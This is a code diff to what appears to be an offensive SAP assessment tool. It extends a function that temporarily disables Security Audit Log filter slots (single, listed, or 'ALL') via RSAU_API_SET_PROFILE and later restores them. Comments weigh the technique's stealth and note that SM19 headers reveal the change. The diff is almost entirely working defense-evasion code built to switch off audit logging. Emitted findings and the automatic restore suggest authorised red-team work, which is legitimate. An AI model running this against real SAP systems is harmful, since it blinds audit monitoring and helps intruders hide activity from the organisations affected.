@@ -456,6 +456,37 @@ def tier3_probe_dyn_profile(state, node, creds=None,
             "loot_path": loot_path}
 
 
+def _normalize_slotnos(slotno_input, all_rows) -> list:
+    """Resolve an operator-supplied slot identifier into a list of
+    canonical 4-digit slot strings present in the dyn-profile rows.
+
+    Accepted input shapes:
+      - ``"1"`` / ``"0001"`` / ``1`` → ``["0001"]``
+      - ``"1,2,3"`` / ``"0001,0002"`` → list of zero-padded entries
+      - ``["1", 2, "0003"]`` (list/tuple/set) → list of zero-padded
+      - ``"ALL"`` (case-insensitive) → every currently-active slot
+        (``STATUS='X'``) in ``all_rows``.  Inactive placeholder slots
+        are excluded so the operator doesn't accidentally write
+        STATUS=' ' onto already-empty rows.
+      - empty / blank → ``[]``
+    """
+    if isinstance(slotno_input, (list, tuple, set)):
+        return [str(s).strip().zfill(4)
+                for s in slotno_input
+                if str(s).strip()]
+    s = str(slotno_input or "").strip()
+    if not s:
+        return []
+    if s.upper() == "ALL":
+        return [str(r.get("SLOTNO", "")).strip().zfill(4)
+                for r in all_rows or []
+                if str(r.get("STATUS", "")).strip() == "X"]
+    if "," in s:
+        return [p.strip().zfill(4)
+                for p in s.split(",") if p.strip()]
+    return [s.zfill(4)]
+
+
 def tier3_sal_slot_disable(state, node, slotno,
                               profile_name: str = "",
                               hold_seconds: float = 5.0,
@@ -499,15 +530,7 @@ def tier3_sal_slot_disable(state, node, slotno,
                              slotno=str(slotno),
                              hold_seconds=hold_seconds)
 
-    slotno_str = str(slotno).strip().zfill(4)
     sid = getattr(node, "sid", "?")
-
-    # Resolve the static profile name we'll pass as ID_NAME to
-    # RSAU_API_SET_PROFILE.  Order of preference:
-    #   1. Explicit operator argument (GUI prompts for it)
-    #   2. Whatever the baseline capture stored on the snapshot
-    #   3. Refuse — the kernel rejects '$DYN$' and empty as
-    #      "not a valid audit profile name"
     explicit_name = (profile_name or "").strip()
 
     try:
@@ -519,18 +542,13 @@ def tier3_sal_slot_disable(state, node, slotno,
         with evasion_window(node, state, technique, creds=creds,
                              touched_params=[],
                              touched_dyn_profile=True) as frame:
-            # Persist the resolved profile name onto the snapshot so
-            # the window's restore phase can call SET_PROFILE with
-            # the same ID_NAME we used for the mutation.  If the
-            # operator passed one explicitly, prefer it; otherwise
-            # use whatever the baseline already had.
             snap = frame["snapshot"]
             effective_name = (explicit_name
                               or snap.sal_profile_name)
             if not effective_name:
                 return _wrap_result(
                     technique, False,
-                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
                     error=("SAL profile name required — pass "
                            "profile_name (visible in RSAU_CONFIG as "
                            "'Current Profile/Filter: <NAME>/NN'; "
@@ -543,7 +561,7 @@ def tier3_sal_slot_disable(state, node, slotno,
             if log_errors:
                 return _wrap_result(
                     technique, False,
-                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
                     error=(f"fresh read failed: "
                             f"{log_errors[0].get('MESSAGE','')}"))
 
@@ -551,32 +569,47 @@ def tier3_sal_slot_disable(state, node, slotno,
             et_filtex = list(current.get("ET_FILTEX") or [])
             et_text = list(current.get("ET_TEXT") or [])
 
-            # Locate the target row.
-            target = None
-            for row in et_filt:
-                if str(row.get("SLOTNO", "")).strip().zfill(4) == slotno_str:
-                    target = row
-                    break
-            if target is None:
+            # Resolve slot list — single, comma-separated, list, or "ALL"
+            target_slots = _normalize_slotnos(slotno, et_filt)
+            if not target_slots:
                 return _wrap_result(
                     technique, False,
-                    slotno=slotno_str, hold_seconds=hold_seconds,
-                    error=f"slot {slotno_str} not present in dyn profile")
+                    slotno=str(slotno), hold_seconds=hold_seconds,
+                    error=("no target slots resolved — "
+                            "supply a slot number, '1,2,3' list, or 'ALL'"))
 
-            baseline_status = str(target.get("STATUS", "")).strip() or " "
+            # Cross-check every requested slot is present in the
+            # current dyn profile and capture baseline status.
+            slot_lookup = {
+                str(r.get("SLOTNO", "")).strip().zfill(4): r
+                for r in et_filt}
+            missing = [s for s in target_slots if s not in slot_lookup]
+            if missing:
+                return _wrap_result(
+                    technique, False,
+                    slotno=",".join(target_slots),
+                    hold_seconds=hold_seconds,
+                    error=(f"slots not present in dyn profile: "
+                            f"{','.join(missing)}"))
+            baseline_statuses = {
+                s: (str(slot_lookup[s].get("STATUS", "")).strip() or " ")
+                for s in target_slots}
             active_before = sum(
                 1 for r in et_filt
                 if str(r.get("STATUS", "")).strip() == "X")
 
-            print(f"[*] {sid}: SAL slot {slotno_str} — current "
-                  f"STATUS={baseline_status!r}; {active_before} of "
+            target_set = set(target_slots)
+            print(f"[*] {sid}: SAL slot disable — targets "
+                  f"{','.join(target_slots)} (baseline statuses "
+                  f"{baseline_statuses}); {active_before} of "
                   f"{len(et_filt)} slot(s) currently active")
 
-            # Mutate — copy rows, flip STATUS on target.
+            # Mutate — copy rows, flip STATUS on every targeted row.
             mutated_filt = []
             for r in et_filt:
                 copy = dict(r)
-                if str(copy.get("SLOTNO", "")).strip().zfill(4) == slotno_str:
+                key = str(copy.get("SLOTNO", "")).strip().zfill(4)
+                if key in target_set:
                     copy["STATUS"] = " "
                 mutated_filt.append(copy)
 
@@ -585,20 +618,33 @@ def tier3_sal_slot_disable(state, node, slotno,
             if not w["ok"]:
                 return _wrap_result(
                     technique, False,
-                    slotno=slotno_str, hold_seconds=hold_seconds,
-                    baseline_status=baseline_status,
+                    slotno=",".join(target_slots),
+                    hold_seconds=hold_seconds,
+                    baseline_statuses=baseline_statuses,
                     before_active_count=active_before,
                     error=f"write failed: {w['error']}")
 
-            print(f"[+] {sid}: SAL slot {slotno_str} disabled — "
-                  f"holding {hold_seconds}s before restore")
+            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
+                  f"disabled — holding {hold_seconds}s before restore")
             try:
                 from sapmap_findings import emit_finding
+                # Stealth caveat — confirmed on S/4 793 lab: the
+                # RSAU_API_SET_PROFILE call paired with ID_NAME=
+                # <static profile name> persists the change through
+                # to disk too.  The static profile's "Last changed
+                # by" timestamp + user fields update visibly in
+                # SM19.  Surface that to the operator so this isn't
+                # mistaken for a fully invisible mutation.
                 emit_finding(
                     "WARNING", sid,
-                    f"Tier 3: SAL slot {slotno_str} disabled "
-                    f"(STATUS X→' ') for {hold_seconds}s window — "
-                    f"verify in SM19 / RSAU_CONFIG")
+                    f"Tier 3: SAL slot(s) {','.join(target_slots)} "
+                    f"disabled (STATUS X→' ') for {hold_seconds}s "
+                    f"window — verify in SM19 / RSAU_CONFIG. "
+                    f"NOTE: this writer also updates the persisted "
+                    f"static profile '{effective_name}' on disk "
+                    f"(visible as 'Last changed by SAPMAP00' in "
+                    f"SM19 header).  Not a stealth-clean primitive "
+                    f"on this kernel.")
             except Exception:
                 pass
 
@@ -606,30 +652,35 @@ def tier3_sal_slot_disable(state, node, slotno,
 
         # Window exit ran restore automatically — log here so the
         # operator sees the round-trip completion clearly.
-        print(f"[+] {sid}: SAL slot {slotno_str} restored — window "
-              f"closed cleanly")
+        print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
+              f"restored — window closed cleanly")
         try:
             from sapmap_findings import emit_finding
             emit_finding(
                 "INFO", sid,
-                f"Tier 3: SAL slot {slotno_str} restored to "
-                f"baseline (STATUS={baseline_status!r})")
+                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
+                f"restored to baseline")
         except Exception:
             pass
         return _wrap_result(
             technique, True,
-            slotno=slotno_str, hold_seconds=hold_seconds,
-            baseline_status=baseline_status,
+            slotno=",".join(target_slots),
+            hold_seconds=hold_seconds,
+            baseline_statuses=baseline_statuses,
             before_active_count=active_before,
-            after_restore="auto via evasion_window")
+            after_restore="auto via evasion_window",
+            stealth_warning=(
+                f"static profile '{effective_name}' "
+                "persisted on disk; SM19 header shows operator "
+                "user/timestamp"))
     except EvasionGateError as e:
         return _wrap_result(technique, False, error=str(e),
-                             slotno=slotno_str,
+                             slotno=str(slotno),
                              hold_seconds=hold_seconds)
     except Exception as e:
         return _wrap_result(
             technique, False, error=f"unexpected: {e!r}",
-            slotno=slotno_str, hold_seconds=hold_seconds)
+            slotno=str(slotno), hold_seconds=hold_seconds)
 
 
 def tier3_capture_baseline_only(state, node, creds=None) -> dict:
